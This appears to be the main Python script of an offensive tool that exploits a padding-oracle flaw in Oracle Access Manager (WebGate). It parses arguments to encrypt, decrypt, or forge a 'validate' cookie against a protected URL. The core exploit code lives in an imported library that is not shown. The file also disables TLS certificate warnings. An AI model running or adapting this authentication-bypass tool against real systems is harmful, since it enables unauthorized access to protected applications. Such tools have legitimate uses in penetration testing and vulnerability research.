#!/usr/bin/env python
import sys

import argparse
import urllib3
import logging
from lib.auth_bypass import OAMAuthBypass
from lib.constants import Constants


class App:
    def __init__(self, args):
        self._args = args

    def run(self):
        self._print_banner()
        self._parse_args()
        self._init_logger()
        auth_bypass = OAMAuthBypass(url=self._args.url, gw_agent_id=self._args.agent_id,
                                    prefix_encquery=self._args.prefix, padding_success_msg=self._args.success_msg,
                                    padding_fail_msg=self._args.fail_msg)

        if self._args.mode == 'g':
            auth_bypass.generate_cookie(cookie=self._args.data)

        elif self._args.mode == 'e':
            auth_bypass.encrypt(self._args.data)

        elif self._args.mode == 'd':
            auth_bypass.decrypt(self._args.data)

        else:
            self._logger.error("Invalid mode specified. Use -h for usage")
            sys.exit(-1)

    @staticmethod
    def _print_banner():
        with open(Constants.BANNER_FILE_NAME) as f:
            print f.read()

    def _parse_args(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-m', '--mode', metavar='<mode>',
                            help='Mode of operation (e: encrypt, d: decrypt, g:generate "validate" value for cookie)',
                            required=True)
        parser.add_argument('-d', '--data', metavar='<data>',
                            help='Value of cipher-text, clear-text, or cookie (depends on mode)',
                            required=True)
        parser.add_argument('-a', '--agent-id', metavar='<agent-id>',
                            help='Agent ID for Oracle Web Gateway to use (Different agents may use different keys)')
        parser.add_argument('-p', '--prefix', metavar='<prefix>',
                            help='Prefix: a valid base64 encoded encquery value with last block '
                                 'starts with a space character')
        parser.add_argument('-s', '--success-msg', metavar='<success-msg>',
                            help='Numeric response status code or string to match in response body when '
                                 'NO padding error is returned',
                            default=Constants.DEFAULT_PADDING_SUCCESS_MSG)
        parser.add_argument('-f', '--fail-msg', metavar='<fail-msg>',
                            help='Numeric response status code or string to match in response body when '
                                 'padding error is returned',
                            default=Constants.DEFAULT_PADDING_FAIL_MSG)
        parser.add_argument('-v', '--verbose', help='Verbose output', action='store_true')
        parser.add_argument("url", help="URL of a resource protected by OAM (Oracle WebGate)")

        # TODO validate args
        self._args = parser.parse_args()

    def _init_logger(self):
        self._logger = logging.getLogger(Constants.LOGGER_NAME)
        logging_level = logging.DEBUG if self._args.verbose else logging.INFO
        self._logger.setLevel(logging_level)

        console_formatter = logging.Formatter('[+] %(message)s')
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(console_formatter)
        console_handler.setLevel(logging_level)

        file_formatter = logging.Formatter(
            '[%(asctime)s] p%(process)s {%(pathname)s:%(lineno)d} %(levelname)s - %(message)s')
        file_handler = logging.FileHandler('app.log')
        file_handler.setFormatter(file_formatter)
        file_handler.setLevel(logging_level)

        self._logger.addHandler(console_handler)
        self._logger.addHandler(file_handler)

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        sys.tracebacklimit = 0

        po_logger = logging.getLogger(Constants.PO_CLASS_NAME)
        po_logger.setLevel(logging_level)
        po_logger.addHandler(console_handler)
        po_logger.addHandler(file_handler)


def main():
    import sys
    app = App(sys.argv)
    app.run()


if __name__ == '__main__':
    main()
